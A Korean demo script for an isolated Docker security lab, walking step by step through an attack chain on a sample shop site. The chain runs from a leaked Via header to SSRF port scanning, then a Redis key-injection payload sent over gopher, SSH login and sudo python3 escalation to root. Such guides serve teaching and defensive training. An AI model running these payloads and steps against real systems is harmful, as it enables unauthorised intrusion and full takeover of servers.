# 시연 가이드 (사전 정찰 → Via 헤더 → SSRF → Redis 계정 열거/키 주입 → SSH → sudo 권한상승)

이 문서는 `README.md`의 기술 문서를 바탕으로, 실제로 화면 앞에서 시연할 때 순서대로 따라 할 수 있도록
정리한 실습 스크립트입니다. 쇼핑몰(`ec-site`) 화면은 **일본어 UI + 엔화(¥) 표시**로 되어 있습니다.

> ⚠️ 반드시 격리된 로컬 Docker 환경에서만 실행하세요. `internal-net`(Redis/Squid)은 host에서 직접
> 도달할 수 없습니다. ec-site(80)와 proxy-server의 SSH(22)만 host에 발행되어 있어, 공격자 관점
> 명령 대부분은 host 터미널에서 바로 실행할 수 있습니다. `attacker` 컨테이너는 네트워크 세그멘테이션
> 자체를 보여줄 때(1단계 참고) 선택적으로 사용합니다.
>
> host의 22번을 그대로 매핑했으므로, macOS "원격 로그인"이 켜져 있으면 포트가 충돌합니다. 랩을 쓰는
> 동안은 꺼두세요.

## 0. 사전 준비

```bash
cd lab-rb
docker compose up --build -d   # 최초 빌드 + 백그라운드 기동
docker compose ps              # ec-site / proxy-server / attacker 모두 Up 확인
```

브라우저에서 `http://localhost` 접속 → 일본어 쇼핑몰 홈 화면(상품 그리드, ¥ 가격)이 보이면 준비 완료.

문제가 생기면 언제든 초기화:

```bash
docker compose down -v && docker compose up --build -d
```

---

## 1단계 — 사전 정찰: 외부에서 SSH 포트를 먼저 발견해둔다

공격자가 Redis부터 뚫는 게 아니라, **이미 대상 조직의 공인 IP를 스캔해서 22번(SSH)이 열려 있다는 걸
알고 있었다**는 전제를 먼저 보여줍니다. 이 시점엔 어떤 서버인지, 어떤 계정이 있는지 전혀 모르고 키도
없어서 그냥 기록만 해두고 넘어갑니다 — 뒤에서 다시 등장할 복선입니다.

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 root@localhost
```

**결과**: `Permission denied (publickey).` — 포트는 도달하지만(소스 IP 제한이 없어 host에서도 그대로
접근 가능) 계정도 키도 몰라 지금은 손댈 수 없습니다.

mgmt-net 안에서는 Squid/Redis 포트가 아예 막혀 있다는 것도 attacker 컨테이너로 보여줄 수 있습니다
(host에는 애초에 3128/6379가 발행되어 있지 않아 host에서는 이 차단 자체를 관찰할 수 없습니다):

```bash
docker compose exec attacker sh -c \
  "curl -s -o /dev/null -w '%{http_code}\n' --max-time 4 http://proxy-server:3128/"   # 응답 없음(차단)
```

---

## 2단계 — 정상 사용자 흉내내기 (회원가입 → 로그인 → 장바구니)

이제 접근하기 쉬운 웹 앱(쇼핑몰)부터 공략합니다. 공격 전에, 이 사이트가 "평범한 이커머스"로 보인다는
것부터 보여줍니다.

1. `http://localhost` → 상단 네비게이션 **新規登録**(회원가입) 클릭 → 이메일/비밀번호 입력 후 가입.
2. 자동으로 **ログイン**(로그인) 페이지로 이동 → 방금 만든 계정으로 로그인.
3. 상품 하나 클릭 → 상세 페이지에서 **カートに入れる**(장바구니 담기) → 상단 **カート**(장바구니) 클릭.
4. 수량 변경/삭제가 정상 동작하는 것을 보여준 뒤 **注文する**(주문하기) → 이름/주소 입력 →
   **注文を確定する**(주문 확정) → "ご注文が完了しました。"(주문 완료) 화면 확인.

> 이 단계의 목적은 "특별한 것 없는 평범한 쇼핑몰"이라는 인상을 주는 것입니다. 실제 취약점은
> 다음 단계부터 시작됩니다.

---

## 3단계 — 정찰: 마이페이지 프로필 이미지 등록으로 내부 호스트명 알아내기

1. 로그인 상태에서 상단 **マイページ** 클릭.
2. "プロフィール画像URLの登録" 폼에 아무 이미지 URL(예: `http://example.com/`, `https://example.com/`
   둘 다 가능)을 입력하고 **登録** 클릭.
3. 개발자도구(F12) → Network 탭에서 방금 보낸 `POST /profile/image-preview` 요청의 Response Headers를
   확인하면 다음 헤더가 보입니다:

   ```
   Via: 1.1 proxy-server.internal (squid/x.x)
   ```

   버튼 하나 눌러 "정상 기능"을 사용해본 것만으로 내부 프록시 호스트명(`proxy-server.internal`)이
   드러났습니다. **이 이름 자체가 게이트웨이/배스천 성격을 암시합니다** — 1단계에서 봐뒀던 그 22번
   포트와 같은 서버일 가능성을 의심하게 되는 지점입니다.

CLI로도 동일하게 확인할 수 있습니다:

```bash
curl -s -D - -c /tmp/c.txt -b /tmp/c.txt -X POST http://localhost/profile/image-preview \
  -d "url=http://example.com/" -o /dev/null
```
(사전에 `/register`, `/login`으로 로그인 쿠키를 만들어 둬야 합니다.)

---

## 4단계 — SSRF 블라인드 포트 스캔: 상품 이미지 자동 로딩 엔드포인트 악용

`GET /product/image?url=...`는 페이지를 열 때마다 상품 이미지를 자동으로 로드하는 기능이지만, Squid를
거치지 않고 목적지에 직접 연결하며 목적지 검증이 없습니다. 방금 알아낸 `proxy-server.internal`을
대상으로 host에서 직접 확인합니다:

```bash
# Redis(6379): 열려 있지만 HTTP가 아님 → 200 "port open, non-http response"
curl -s "http://localhost/product/image?url=http://proxy-server.internal:6379/"

# 닫힌 포트 → 502 "connection refused"
curl -s "http://localhost/product/image?url=http://proxy-server.internal:9999/"

# Squid(3128): 열려 있고 HTTP 응답 → 200
curl -s -o /dev/null -w "%{http_code}\n" "http://localhost/product/image?url=http://proxy-server.internal:3128/"
```

세 가지 응답이 명확히 구분되어 블라인드 포트 스캔이 가능함을 보여줍니다. Redis(6379)가 미인증으로
열려 있다는 것을 확인했으니, 이제 1단계에서 봐뒀던 SSH 포트를 "채울" 방법이 생겼습니다.

---

## 5단계 — Redis로 계정 열거 + SSH 공개키 주입

Redis가 미인증이라는 것만으로는 아직 부족합니다 — **어떤 계정으로 SSH가 열려 있는지 모릅니다.**
이 단계부터는 host에서 `exploit.py`로 자동화되어 있습니다 (repo 루트에서):

```bash
python3 exploit.py
```

`exploit.py`가 하는 일:

1. **계정 열거**: `CONFIG SET dir /home/<후보>/.ssh`를 계정명 워드리스트(`ubuntu`, `admin`,
   `deploy`, `proxyuser`, ... `exploit.py`의 `USERNAME_CANDIDATES`)에 대해 gopher로 반복 전송합니다.
   Redis는 그 경로가 실제로 존재해야만 `+OK`를 반환하므로, 어떤 계정이 이 서버에 있는지 알아낼 수
   있습니다(미인증 Redis를 "디렉토리 존재 여부 오라클"로 쓰는 기법).
2. **키 생성**: host에 새 SSH 키쌍(`id_ed25519`, `id_ed25519.pub`, repo 루트에 생성)을 만듭니다.
3. **키 주입**: 찾아낸 계정에 대해 gopher RESP 페이로드로 Redis 명령을 순서대로 전송합니다:
   - `CONFIG SET dir /home/<찾은 계정>/.ssh`
   - `CONFIG SET dbfilename authorized_keys`
   - `SET payload "\n\n<attacker 공개키>\n\n"`
   - `SAVE`
4. ec-site의 `/product/image?url=gopher://proxy-server.internal:6379/_...`로 위 페이로드를 전송 —
   attacker는 internal-net에 직접 도달할 수 없으므로 반드시 이 SSRF를 거쳐야 합니다.
5. `+OK\r\n+OK\r\n+OK\r\n+OK\r\n` 응답이 오면 `/home/<찾은 계정>/.ssh/authorized_keys`에 공개키가
   기록된 것입니다. (`.ssh` 디렉토리가 Redis 실행 계정과 그룹 쓰기 권한을 공유하도록 오설정되어
   있기 때문에 가능합니다 — README 취약점 5 참고.)

수동으로 확인하려면 (계정명은 실행 로그에서 확인):

```bash
docker compose exec proxy-server cat -A /home/<찾은 계정>/.ssh/authorized_keys
```
RDB 바이너리 헤더/푸터 사이에 `ssh-ed25519 AAAA...` 형태의 유효한 키 줄이 보이면 성공입니다.

---

## 6단계 — SSH 로그인 → sudo 권한상승 → root 셸

`exploit.py`가 이어서 자동으로 수행하지만, 수동으로도 재현할 수 있습니다 (host에서, `<계정>`은
5단계에서 찾은 이름으로 교체):

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 -i id_ed25519 \
  <계정>@localhost "id; sudo -l"
```

**결과**: 이번엔 1단계와 달리 로그인에 성공합니다 (`uid=...(<계정>) ...`) — 1단계에서 발견해뒀던 바로 그
포트입니다. `sudo -l`은 다음을 보여줍니다:

```
User <계정> may run the following commands on proxy-server:
    (ALL) NOPASSWD: /usr/bin/python3
```

root 셸 획득:

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 -i id_ed25519 \
  <계정>@localhost "sudo /usr/bin/python3 -c 'import os; os.system(\"id\")'"
```

`uid=0(root) gid=0(root) groups=0(root)`가 출력되면 킬체인 전체(사전 정찰 → Via 정찰 → SSRF →
Redis 계정 열거/미인증 접근 → SSH 키 주입 → 배스천 소스 IP 미제한 → sudo 권한상승 → root)가
완성된 것입니다.

---

## 트러블슈팅

- **`ssh: connect to host localhost port 22: Connection refused`**: `docker compose ps`로
  proxy-server가 Up 상태이고 PORTS 열에 `0.0.0.0:22->22/tcp`가 보이는지 확인하세요.
- **`ssh: connect to host localhost port 22: Connection reset` 또는 macOS 자체 SSH와 충돌**:
  시스템 설정 → 일반 → 공유 → "원격 로그인"이 켜져 있으면 host의 22번을 macOS 자체 sshd가 이미 쓰고
  있는 것입니다. 꺼두고 `docker compose up -d`를 다시 실행하세요.
- **`Authentication refused: bad ownership or modes for file ...`가 `docker compose logs
  proxy-server`에 보임**: `sshd_config`의 `StrictModes no`가 이미지에 반영됐는지 확인
  (`docker compose build proxy-server`로 재빌드).
- **exploit.py가 `[-] no candidate account had a home directory`로 종료**: 계정명 워드리스트에
  실제 계정이 없는 것입니다. `exploit.py`의 `USERNAME_CANDIDATES`에 후보를 추가하세요.
- **exploit.py 재실행 시 `ssh-keygen` 오류**: `exploit.py`가 매 실행마다 기존 키를 자동으로 지우고
  새로 만들도록 되어 있어 보통 발생하지 않지만, 남아있다면 repo 루트에서
  `rm -f id_ed25519 id_ed25519.pub` 후 다시 실행하세요.
- **완전 초기화**: `docker compose down -v && docker compose up --build -d`
